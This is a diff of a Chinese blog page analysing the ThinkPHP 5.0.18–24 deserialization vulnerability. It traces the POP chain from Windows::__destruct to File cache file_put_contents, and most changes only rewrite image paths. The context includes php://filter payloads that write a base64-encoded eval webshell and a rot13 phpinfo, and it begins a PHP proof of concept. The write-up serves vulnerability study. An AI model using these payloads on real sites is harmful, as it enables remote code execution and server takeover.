@@ -57,45 +57,45 @@ $result = file_put_contents($filen,">
         <div class="content markdown">
             <p>seay源码审计，这里是利用点**/thinkphp/library/think/cache/driver/File.php**</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108141600243.png" alt="image-20211108141600243"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/4.png" alt="image-20211108141600243"></p>
 <p>从反序列化起点开始分析：</p>
 <h5 id="thinkphp-library-think-process-pipes-Windows-php"><a href="#thinkphp-library-think-process-pipes-Windows-php" class="headerlink" title="thinkphp/library/think/process/pipes/Windows.php"></a>thinkphp/library/think/process/pipes/Windows.php</h5><p>__destruct方法</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108142854098.png" alt="image-20211108142854098"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/2.png" alt="image-20211108142854098"></p>
 <p>调用removeFiles，跟进</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108143027678.png" alt="image-20211108143027678"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/3.png" alt="image-20211108143027678"></p>
 <p>vscode中左上二可进行全局搜索</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108143117628.png" alt="image-20211108143117628"></p>
-<h5 id="跳板利用点：thinkphp-library-think-Model-php"><a href="#跳板利用点：thinkphp-library-think-Model-php" class="headerlink" title="跳板利用点：thinkphp/library/think/Model.php"></a>跳板利用点：thinkphp/library/think/Model.php</h5><p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108143236007.png" alt="image-20211108143236007"></p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108143300312.png" alt="image-20211108143300312"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/5.png" alt="image-20211108143117628"></p>
+<h5 id="跳板利用点：thinkphp-library-think-Model-php"><a href="#跳板利用点：thinkphp-library-think-Model-php" class="headerlink" title="跳板利用点：thinkphp/library/think/Model.php"></a>跳板利用点：thinkphp/library/think/Model.php</h5><p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/6.png" alt="image-20211108143236007"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/7.png" alt="image-20211108143300312"></p>
 <p>存在三个地方可以调用__call,调试后选择第三处作为跳板</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108143610613.png" alt="image-20211108143610613"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/8.png" alt="image-20211108143610613"></p>
 <pre class=" language-PHP"><code class="language-PHP">$item[$key] = $value ? $value->getAttr($attr) : null;</code></pre>
 <pre class=" language-PHP"><code class="language-PHP">$modelRelation = $this->$relation();
 $value         = $this->getRelationData($modelRelation);</code></pre>
 <p>getRelationData</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108145213733.png" alt="image-20211108145213733"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/9.png" alt="image-20211108145213733"></p>
 <p>跟进OneToOne类getBindAttr方法</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108150005998.png" alt="image-20211108150005998"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/10.png" alt="image-20211108150005998"></p>
 <p>至此代码执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行Output类__call魔术方法</p>
 <h5 id="thinkphp-library-think-console-Output-php"><a href="#thinkphp-library-think-console-Output-php" class="headerlink" title="thinkphp/library/think/console/Output.php"></a>thinkphp/library/think/console/Output.php</h5><p>Output类中__call方法，调用block方法做跳板</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108142437435.png" alt="image-20211108142437435"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/11.png" alt="image-20211108142437435"></p>
 <p>output类block方法</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108150404705.png" alt="image-20211108150404705"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/12.png" alt="image-20211108150404705"></p>
 <p>跟进writein</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108150458498.png" alt="image-20211108150458498"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/13.png" alt="image-20211108150458498"></p>
 <p>跟进Memcached类write方法</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108150621662.png" alt="image-20211108150621662"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/14.png" alt="image-20211108150621662"></p>
 <p>继续跟进set</p>
-<h5 id="thinkphp-library-think-cache-driver-File-php"><a href="#thinkphp-library-think-cache-driver-File-php" class="headerlink" title="thinkphp/library/think/cache/driver/File.php"></a>thinkphp/library/think/cache/driver/File.php</h5><p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108150824402.png" alt="image-20211108150824402"></p>
+<h5 id="thinkphp-library-think-cache-driver-File-php"><a href="#thinkphp-library-think-cache-driver-File-php" class="headerlink" title="thinkphp/library/think/cache/driver/File.php"></a>thinkphp/library/think/cache/driver/File.php</h5><p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/15.png" alt="image-20211108150824402"></p>
 <p>发现file_put_contents函数</p>
 <p>$filename<code>可控且可以利用伪协议绕过</code>exit</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108150954684.png" alt="image-20211108150954684"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/16.png" alt="image-20211108150954684"></p>
 <p><code>$data</code>值比较棘手,这里有个坑，由于最后调用<code>set</code>方法中的参数来自先前调用的<code>write</code>方法</p>
 <p>只能为<code>true</code>，且这里<code>$expire</code>只能为数值，这样文件内容就无法写<strong>shell</strong></p>
 <p>用文章里的一张图</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108151220943.png" alt="image-20211108151220943"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/17.png" alt="image-20211108151220943"></p>
 <p>跟进setTagItem，会再执行一次<code>set</code>方法，且这里文件内容<code>$value</code>通过<code>$name</code>赋值(文件名)</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20211108151334856.png" alt="image-20211108151334856"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/18.png" alt="image-20211108151334856"></p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?></span></code></pre>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</span></code></pre>
 <h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><ol>
@@ -109,7 +109,7 @@ $value         = $this->getRelationData($modelRelation);</code></pre>
 <li>setTagItem再次调用set，此时参数可控，写入webshell</li>
 </ol>
 <p>使用文章里的一张图</p>
-<p><img src="/ThinkPHP5-0-18-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/1.png" alt="1"></p>
+<p><img src="/2021/11/08/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/1.png" alt="1"></p>
 <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 
 <span class="token comment" spellcheck="true">//__destruct</span>
